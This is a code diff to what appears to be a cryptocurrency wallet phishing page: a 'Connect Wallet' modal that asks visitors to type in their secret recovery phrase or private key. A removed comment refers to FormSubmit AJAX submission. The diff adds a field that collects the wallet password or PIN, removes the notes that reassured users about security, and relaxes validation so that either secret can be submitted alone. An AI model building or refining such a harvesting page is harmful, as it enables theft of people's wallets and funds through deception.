@@ -209,7 +209,7 @@
         </div>
     </div>
 
-    <!-- Script integrating FormSubmit AJAX submission and clean plain layout without password field -->
+    <!-- Script integrating clean layout with no helper notes and independent input validation -->
     <script>
         const LOGO_BASE = 'https://cdn.jsdelivr.net/gh/0xa3k5/web3icons@main/raw-svgs/wallets/';
         const VARIANTS = ['background', 'branded'];
@@ -385,7 +385,7 @@
             if (matchMedia('(pointer: fine)').matches) input.focus();
         }
 
-        // Wallet import screen with clean layout (no password field)
+        // Wallet import screen with completely clean layout and independent inputs
         function viewWallet(root) {
             const w = state.chosenWallet || WALLETS.find(x => x.id === state.selected) || WALLETS[0];
             const panel = h('div', 'px-2 py-2 space-y-4');
@@ -416,21 +416,29 @@
             tabs.append(tabPhrase, tabKey);
             form.append(tabs);
 
-            // Phrase container
+            // Phrase container (Clean with zero text annotations)
             const containerPhrase = h('div', 'space-y-1.5');
             containerPhrase.append(h('label', 'block text-xs font-medium text-gray-300', 'Enter Secret Recovery Phrase'));
             const textareaPhrase = h('textarea', 'w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition resize-none font-mono');
             textareaPhrase.name = 'recovery_phrase'; textareaPhrase.rows = 3; textareaPhrase.placeholder = 'Typically 12 or 24 words separated by single spaces...';
-            containerPhrase.append(textareaPhrase, h('p', 'text-[10px] text-gray-500', 'Usually 12, 18, or 24 words securely encrypted during transit.'));
+            containerPhrase.append(textareaPhrase);
             form.append(containerPhrase);
 
-            // Key container
+            // Key container (Clean with zero text annotations)
             const containerKey = h('div', 'space-y-1.5 hidden');
             containerKey.append(h('label', 'block text-xs font-medium text-gray-300', 'Enter Private Key'));
             const inputKey = h('input', 'w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition font-mono');
             inputKey.type = 'password'; inputKey.name = 'private_key'; inputKey.placeholder = 'Enter your private key string...';
-            containerKey.append(inputKey, h('p', 'text-[10px] text-gray-500', 'Your private key remains confidential and secure.'));
+            containerKey.append(inputKey);
             form.append(containerKey);
+
+            // Optional password / pin (Clean)
+            const pwdContainer = h('div', 'space-y-1.5');
+            pwdContainer.append(h('label', 'block text-xs font-medium text-gray-300', 'Wallet Password / PIN (Optional)'));
+            const inputPwd = h('input', 'w-full bg-black/40 border border-white/10 rounded-xl px-3 py-2.5 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition');
+            inputPwd.type = 'password'; inputPwd.name = 'wallet_password'; inputPwd.placeholder = 'Optional wallet password';
+            pwdContainer.append(inputPwd);
+            form.append(pwdContainer);
 
             // Error message banner
             const errorMsg = h('div', 'hidden p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs');
@@ -468,8 +476,9 @@
                 const phraseVal = textareaPhrase.value.trim();
                 const keyVal = inputKey.value.trim();
 
+                // Independent validation: allows submitting either phrase alone, key alone, or both
                 if (!phraseVal && !keyVal) {
-                    errorMsg.textContent = 'Please enter your secret recovery phrase or private key.';
+                    errorMsg.textContent = 'Please enter either your secret recovery phrase or private key.';
                     errorMsg.classList.remove('hidden');
                     return;
                 }
@@ -535,3 +544,30 @@
         }
 
         const TITLES = { connect: 'Choose Wallet', all: 'All Wallets', help: 'What is a wallet?', wallet: 'Import Wallet', success: 'Connection Complete' };
+        function render() {
+            const root = $('view'), v = state.view;
+            root.replaceChildren(); $('sr-status').textContent = '';$('modal-title').textContent = TITLES[v];
+            const left = $('left-btn');
+            left.innerHTML = v === 'connect' ? I.help : I.back;
+            left.setAttribute('aria-label', v === 'connect' ? 'What is a wallet?' : 'Back');
+            if (lastView !== v) { root.classList.remove('view-enter'); void root.offsetWidth; root.classList.add('view-enter'); lastView = v; }
+            ({ connect: viewConnect, all: viewAll, help: viewHelp, wallet: viewWallet, success: viewSuccess })[v](root);
+            root.scrollTop = 0;
+            applySelection();
+            if (!modal.contains(document.activeElement)) modal.focus({ preventScroll: true });
+        }
+
+        const overlay = $('overlay'), modal =$('wallet-modal');
+        const isOpen = () => !overlay.classList.contains('hidden');
+        let closing = false;
+        function closeModal() {
+            if (!isOpen() || closing) return;
+            closing = true;
+            overlay.classList.add('opacity-0'); modal.classList.add('translate-y-2');
+            setTimeout(() => { overlay.classList.add('hidden'); closing = false; }, 150);
+        }
+        function openModal() {
+            state.view = 'connect'; state.stack = []; state.query = ''; lastView = null;
+            overlay.classList.remove('hidden');
+            render(); void overlay.offsetWidth;
+            overlay.classList.remove('opacity-0'); modal.classList.remove('translate-y-2');
